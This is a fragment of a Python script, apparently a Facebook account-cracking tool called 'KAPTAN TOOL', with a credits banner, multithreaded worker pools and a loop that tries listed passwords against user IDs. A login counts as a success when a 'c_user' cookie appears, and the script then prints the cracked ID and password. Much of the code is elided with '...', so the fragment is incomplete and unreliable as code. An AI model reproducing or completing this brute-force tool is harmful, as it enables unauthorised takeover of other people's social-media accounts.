...
psb('\x1b[1;31mKAPTAN TOOL CLONING START PLEASE WAIT ..........')
time.sleep(3)
...
|_/    \/|/     \||/          )_(   |/     \||/    )_)
  ...
  \033[1;32m|     \033[1;33m[✓] CREATED BY\33[0;m   :  \033[1;33mKAPTAN   \033[1;92m|
  \033[1;32m|     \033[1;32m[✓] FACEBOK      : \033[1;34m ABU BAKAR            \033[1;92m|
  \033[1;32m|     \033[1;35m[✓] GITHUB       :  \033[1;35Jhalla11             \033[1;92m|
  \033[1;32m|     \033[1;36m[✓] TOOL STATUS  :  \033[1;36mRandom Tools          \033[1;92m|
  \033[1;32m|     \033[1;35m[✓] TEAM         :  \033[1;35mALONE                  \033[1;92m|
 ...
 #   print(f"")
  #  linex()
    ...
    with ThreadPool(max_workers=80) as manshera:    
       ...
       # print(f'  {M}  ╚════════════════════════════════════════╝ {P}')
        print(f'{RED}════════════════════════════════════════')
        print(f"{P}[{H}•{P}]  {WHITE}WElCOME  TO KAPTAN TOOL     : {RED}"+name)
...
def sh8():
    ...
    with ThreadPool(max_workers=30) as manshera:    
        ...
        banner()
        tl = str(len(user))
        print(f'{M}╔══[•] {RED} WELLCOME TO KAPTAN TOOL     : {RED}'+name)
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print('    \033[1;92m[KAPTAN-OK] '+uid+' | '+ps+'\033[0;97m')
